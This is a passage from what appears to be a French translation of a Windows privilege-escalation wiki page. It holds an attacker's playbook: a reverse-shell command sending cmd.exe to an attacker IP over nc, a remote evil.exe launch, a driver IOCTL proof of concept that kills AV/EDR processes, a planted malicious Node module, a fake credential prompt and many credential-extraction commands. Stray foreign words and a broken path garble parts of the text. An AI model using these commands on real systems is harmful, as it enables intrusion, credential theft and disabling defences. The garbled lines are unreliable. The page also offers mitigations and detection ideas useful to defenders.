Windows permet aux utilisateurs de spécifier les actions à effectuer si un service échoue. Cette fonctionnalité peut être configurée pour pointer vers un binaire. Si ce binaire est remplaçable, une élévation de privilèges peut être possible. Plus de détails peuvent être trouvés dans la [documentation officielle](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Applications installées

Vérifiez les **permissions des binaires** (peut-être pouvez-vous en écraser un et élever les privilèges) et des **dossiers** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Autorisations d'écriture

Vérifiez si vous pouvez modifier un fichier de configuration pour lire un fichier spécial, ou si vous pouvez modifier un binaire qui va être exécuté par un compte Administrator (schedtasks).

Une façon de trouver des permissions faibles sur les dossiers/fichiers dans le système est de faire :
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ autoload any plugin DLL dans ses sous-dossiers `plugins`. Si une installation portable/copy inscriptible est présente, déposer un plugin malveillant donne une exécution automatique du code dans `notepad++.exe` à chaque lancement (y compris depuis `DllMain` et les callbacks du plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Vérifiez si vous pouvez écraser un registre ou binaire qui va être exécuté par un autre utilisateur.**\
**Lisez** la **page suivante** pour en savoir plus sur les emplacements intéressants d'**autoruns** afin d'élever les privilèges** :


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Cherchez d'éventuels drivers **third party weird/vulnerable**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Si un pilote expose une primitive arbitraire de lecture/écriture kernel (fréquent dans des gestionnaires IOCTL mal conçus), vous pouvez élever vos privilèges en volant directement un token SYSTEM depuis la mémoire kernel. Voir la technique étape par étape ici :

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Pour les bugs de race-condition où l’appel vulnérable ouvre un chemin Object Manager contrôlé par l’attaquant, ralentir délibérément la recherche (en utilisant des composants de longueur maximale ou de গভ? directory chains profondes) peut étendre la fenêtre de quelques microsecondes à des dizaines de microsecondes :

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitives de corruption mémoire des registry hives

Les vulnérabilités hive modernes permettent de groom des layouts déterministes, d’abuser des descendants HKLM/HKU inscriptibles, et de convertir une corruption de métadonnées en overflows kernel paged-pool sans pilote personnalisé. Découvrez la chaîne complète ici :

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Certains pilotes tiers signés créent leur device object avec un SDDL fort via IoCreateDeviceSecure mais oublient de définir FILE_DEVICE_SECURE_OPEN dans DeviceCharacteristics. Sans ce flag, la DACL sécurisée n’est pas appliquée lorsque le device est ouvert via un chemin contenant un composant supplémentaire, permettant à n’importe quel utilisateur non privilégié d’obtenir un handle en utilisant un chemin de namespace comme :

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (d’un cas réel)

Une fois qu’un utilisateur peut ouvrir le device, les IOCTL privilégiés exposés par le pilote peuvent être abusés pour LPE et du tampering. Capacités observées en conditions réelles :
- Retourner des handles full-access vers des processus arbitraires (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Lecture/écriture raw disk non restreinte (tampering hors ligne, astuces de persistance au boot).
- Terminer des processus arbitraires, y compris Protected Process/Light (PP/PPL), permettant de tuer AV/EDR depuis user land via kernel.

Modèle PoC minimal (user mode) :
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mesures d'atténuation pour les développeurs
- Toujours définir FILE_DEVICE_SECURE_OPEN lors de la création d'objets device destinés à être restreints par une DACL.
- Validez le contexte de l'appelant pour les opérations privilégiées. Ajoutez des vérifications PP/PPL avant d'autoriser la terminaison d'un process ou le retour de handle.
- Encadrez les IOCTLs (access masks, METHOD_*, validation des entrées) et envisagez des modèles brokered plutôt qu'un accès direct aux privilèges kernel.

Idées de détection pour les défenseurs
- Surveillez les ouvertures en user-mode de noms de device suspects (par ex., \\ .\\amsdk*) et les séquences IOCTL spécifiques indicatives d'un abus.
- Appliquez la blocklist de Microsoft pour les drivers vulnérables (HVCI/WDAC/Smart App Control) et maintenez vos propres listes allow/deny.


## PATH DLL Hijacking

Si vous avez des **droits d'écriture dans un dossier présent dans le PATH**, vous pourriez être en mesure de détourner une DLL chargée par un process et **escalader les privilèges**.

Vérifiez les permissions de tous les dossiers présents dans le PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Pour plus d'informations sur la façon d'abuser de cette vérification :


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Il s'agit d'une variante de **Windows uncontrolled search path** qui affecte les applications **Node.js** et **Electron** lorsqu'elles effectuent un import nu comme `require("foo")` et que le module attendu est **absent**.

Node résout les packages en remontant l'arborescence des répertoires et en vérifiant les dossiers `node_modules` dans chaque répertoire parent. Sur Windows, cette remontée peut atteindre la racine du disque, donc une application lancée depuis `C:\Users\Administrator\project\app.js` peut finir par tester :

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Si un **low-privileged user** peut créer `C:\node_modules`, il peut y déposer un `foo.js` malveillant (ou un dossier de package) et attendre qu'un processus **Node/Electron à privilèges plus élevés** tente de résoudre la dépendance manquante. Le payload s'exécute dans le contexte de sécurité du processus victime, ce qui devient donc une **LPE** chaque fois que la cible s'exécute en tant qu'administrateur, depuis une tâche planifiée/service wrapper élevé, ou depuis une application de bureau privilégiée lancée automatiquement.

C'est particulièrement fréquent lorsque :

- une dépendance est déclarée dans `optionalDependencies`
- une bibliothèque tierce encapsule `require("foo")` dans `try/catch` et continue en cas d'échec
- un package a été supprimé des builds de production, omis lors du packaging, ou a échoué à s'installer
- le `require()` vulnérable se trouve profondément dans l'arborescence des dépendances plutôt que dans le code principal de l'application

### Hunting des cibles vulnérables

Utilisez **Procmon** pour prouver le chemin de résolution :

- Filtrez par `Process Name` = exécutable cible (`node.exe`, l'EXE de l'application Electron, ou le processus wrapper)
- Filtrez par `Path` `contains` `node_modules`
- Concentrez-vous sur `NAME NOT FOUND` et sur l'ouverture finale réussie sous `C:\node_modules`

Schémas utiles de revue de code dans des fichiers `.asar` dépackés ou dans les sources de l'application :
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Identifier le **nom du package manquant** à partir de Procmon ou de la revue du code source.
2. Créer le répertoire de recherche root s'il n'existe pas déjà :
```powershell
mkdir C:\node_modules
```
3. Déposez un module avec le nom exact attendu :
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Déclenchez l'application victime. Si l'application tente `require("foo")` et que le module légitime est absent, Node peut charger `C:\node_modules\foo.js`.

Des exemples réels de modules optionnels manquants qui correspondent à ce schéma incluent `bluebird` et `utf-8-validate`, mais la **technique** est la partie réutilisable : trouvez n'importe quel **bare import manquant** qu'un processus Node/Electron Windows privilégié va résoudre.

### Détection et idées de durcissement

- Alertez lorsqu'un utilisateur crée `C:\node_modules` ou y écrit de nouveaux fichiers/packages `.js`.
- Surveillez les processus à haute intégrité qui lisent depuis `C:\node_modules\*`.
- Regroupez toutes les dépendances d'exécution en production et auditez l'utilisation de `optionalDependencies`.
- Examinez le code tiers à la recherche de motifs silencieux `try { require("...") } catch {}`.
- Désactivez les sondes optionnelles lorsque la bibliothèque le permet (par exemple, certains déploiements `ws` peuvent éviter l'ancienne sonde `utf-8-validate` avec `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Vérifiez s'il existe d'autres ordinateurs connus codés en dur dans le fichier hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces réseau et DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ports ouverts

Vérifiez les **restricted services** depuis l’extérieur
```bash
netstat -ano #Opened ports?
```
### Table de routage
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Table ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Règles de pare-feu

[**Consultez cette page pour les commandes liées au pare-feu**](../basic-cmd-for-pentesters.md#firewall) **(liste des règles, création de règles, désactivation, désactivation...)**

Plus[ de commandes pour l’énumération réseau ici](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` peut aussi être trouvé dans `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si vous obtenez l'utilisateur root, vous pouvez écouter sur n'importe quel port (la première fois que vous utilisez `nc.exe` pour écouter sur un port, il vous demandera via l'interface graphique si `nc` doit être autorisé par le pare-feu).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Pour démarrer facilement bash en tant que root, vous pouvez essayer `--default-user root`

Vous pouvez explorer le système de fichiers `WSL` dans le dossier `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault stocke les credentials utilisateur pour les serveurs, les websites et d'autres programs que **Windows** peut **log in the users automaticall**y. Au premier abord, cela peut sembler indiquer que les utilisateurs peuvent désormais stocker leurs credentials Facebook, Twitter, Gmail, etc., afin qu'ils se connectent automatiquement via les browsers. Mais ce n'est pas le cas.

Windows Vault stocke les credentials que Windows peut utiliser pour log in the users automaticall y, ce qui signifie que toute **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault et utiliser les credentials fournis au lieu de saisir en permanence le username et le password.

À moins que les applications n'interagissent avec Credential Manager, je ne pense pas qu'il soit possible pour elles d'utiliser les credentials d'une ressource donnée. Donc, si votre application veut utiliser le vault, elle doit d'une manière ou d'une autre **communicate with the credential manager and request the credentials for that resource** depuis le default storage vault.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ensuite, vous pouvez utiliser `runas` avec les options `/savecred` afin d’utiliser les informations d’identification enregistrées. L’exemple suivant appelle un binaire distant via un partage SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Utiliser `runas` avec un ensemble d'identifiants fourni.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

L'**Data Protection API (DPAPI)** fournit une méthode de chiffrement symétrique des données, principalement utilisée dans le système d'exploitation Windows pour le chiffrement symétrique des clés privées asymétriques. Ce chiffrement exploite un secret utilisateur ou système pour contribuer de manière significative à l'entropie.

**DPAPI permet le chiffrement des clés au moyen d'une clé symétrique dérivée des secrets de connexion de l'utilisateur**. Dans les scénarios impliquant le chiffrement du système, elle utilise les secrets d'authentification du domaine du système.

Les clés RSA utilisateur chiffrées, via DPAPI, sont stockées dans le répertoire `%APPDATA%\Microsoft\Protect\{SID}`, où `{SID}` représente le [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) de l'utilisateur. **La clé DPAPI, située avec la master key qui protège les clés privées de l'utilisateur dans le même fichier**, se compose généralement de 64 octets de données aléatoires. (Il est important de noter que l'accès à ce répertoire est restreint, empêchant d'en lister le contenu via la commande `dir` dans CMD, bien qu'il puisse être सूची via PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Vous pouvez utiliser le **module mimikatz** `dpapi::masterkey` avec les arguments appropriés (`/pvk` ou `/rpc`) pour le déchiffrer.

Les **fichiers d'identifiants protégés par le mot de passe maître** sont généralement situés dans :
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Vous pouvez utiliser le **module mimikatz** `dpapi::cred` avec le `/masterkey` approprié pour déchiffrer.\
Vous pouvez **extraire de nombreux DPAPI** **masterkeys** depuis la **mémoire** avec le module `sekurlsa::dpapi` (si vous êtes root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

Les **PowerShell credentials** sont souvent utilisées pour des tâches de **scripting** et d’automatisation comme moyen de stocker des identifiants chiffrés de manière pratique. Les credentials sont protégées à l’aide de **DPAPI**, ce qui signifie généralement qu’elles ne peuvent être déchiffrées que par le même utilisateur sur le même ordinateur où elles ont été créées.

Pour **décrypter** une PS credentials depuis le fichier qui la contient, vous pouvez faire :
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connexions RDP enregistrées

Vous pouvez les trouver dans `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
et dans `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Commandes exécutées récemment
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gestionnaire d’identifiants Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Utilisez le module **Mimikatz** `dpapi::rdg` avec le `/masterkey` approprié pour **déchiffrer n'importe quel fichier .rdg**\
Vous pouvez **extraire de nombreuses masterkeys DPAPI** depuis la mémoire avec le module `sekurlsa::dpapi` de Mimikatz

### Sticky Notes

Les gens utilisent souvent l'application StickyNotes sur les postes de travail Windows pour **sauvegarder des mots de passe** et d'autres informations, sans réaliser qu'il s'agit d'un fichier de base de données. Ce fichier se trouve à `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` et il vaut toujours la peine de le rechercher et de l'examiner.

### AppCmd.exe

**Notez que pour récupérer des mots de passe depuis AppCmd.exe, vous devez être Administrator et exécuter avec un niveau High Integrity.**\
**AppCmd.exe** se trouve dans le répertoire `%systemroot%\system32\inetsrv\`.\
Si ce fichier existe, il est possible que certaines **credentials** aient été configurées et puissent être **récupérées**.

Ce code a été extrait de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Vérifie si `C:\Windows\CCM\SCClient.exe` existe .\
Les installateurs sont **exécutés avec les privilèges SYSTEM**, beaucoup sont vulnérables au **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Fichiers et Registre (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Clés d’hôte SSH de Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Clés SSH dans le registre

Les clés privées SSH peuvent être stockées dans la clé de registre `HKCU\Software\OpenSSH\Agent\Keys`, donc vous devriez vérifier s'il y a quelque chose d'intéressant dedans :
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Si vous trouvez une entrée à l'intérieur de ce chemin, il s'agit probablement d'une clé SSH enregistrée. Elle est stockée chiffrée mais peut être facilement déchiffrée en utilisant [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Plus d'informations sur cette technique ici : [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Si le service `ssh-agent` n'est pas en cours d'exécution et que vous voulez qu'il démarre automatiquement au boot, exécutez :
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Il semble que cette technique ne soit plus valide. J'ai essayé de créer quelques clés ssh, de les ajouter avec `ssh-add` et de me connecter via ssh à une machine. Le registre HKCU\Software\OpenSSH\Agent\Keys n'existe pas et procmon n'a pas identifié l'utilisation de `dpapi.dll` lors de l'authentification par clé asymétrique.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Vous pouvez également rechercher ces fichiers avec **metasploit** : _post/windows/gather/enum_unattend_

Exemple de contenu :
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Sauvegardes SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Identifiants Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Recherchez un fichier appelé **SiteList.xml**

### Cached GPP Pasword

Une fonctionnalité était auparavant disponible et permettait le déploiement de comptes administrateur locaux personnalisés sur un groupe de machines via Group Policy Preferences (GPP). Cependant, cette méthode présentait d’importantes failles de sécurité. Premièrement, les Group Policy Objects (GPOs), stockés sous forme de fichiers XML dans SYSVOL, pouvaient être accessibles par n’importe quel utilisateur du domaine. Deuxièmement, les mots de passe contenus dans ces GPPs, chiffrés en AES256 à l’aide d’une clé par défaut documentée publiquement, pouvaient être déchiffrés par n’importe quel utilisateur authentifié. Cela représentait un risque sérieux, car cela pouvait permettre à des utilisateurs d’obtenir des privilèges élevés.

Pour atténuer ce risque, une fonction a été développée afin de rechercher les fichiers GPP mis en cache localement contenant un champ "cpassword" non vide. Lorsqu’un tel fichier est trouvé, la fonction déchiffre le mot de passe et renvoie un objet PowerShell personnalisé. Cet objet inclut des détails sur le GPP et l’emplacement du fichier, ce qui aide à l’identification et à la correction de cette vulnérabilité de sécurité.

Recherchez dans `C:\ProgramData\Microsoft\Group Policy\history` ou dans _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (avant W Vista)_ ces fichiers :

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Pour déchiffrer le cPassword :**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Utiliser crackmapexec pour obtenir les mots de passe :
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Exemple de web.config avec des credentials :
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Identifiants OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Journaux
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Demander des identifiants

Vous pouvez toujours **demander à l'utilisateur d'entrer ses identifiants ou même les identifiants d'un autre utilisateur** si vous pensez qu'il peut les connaître (notez que **demander** directement au client les **identifiants** est vraiment **risqué**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Noms de fichiers possibles contenant des credentials**

Fichiers connus qui contenaient autrefois des **passwords** en **clear-text** ou en **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
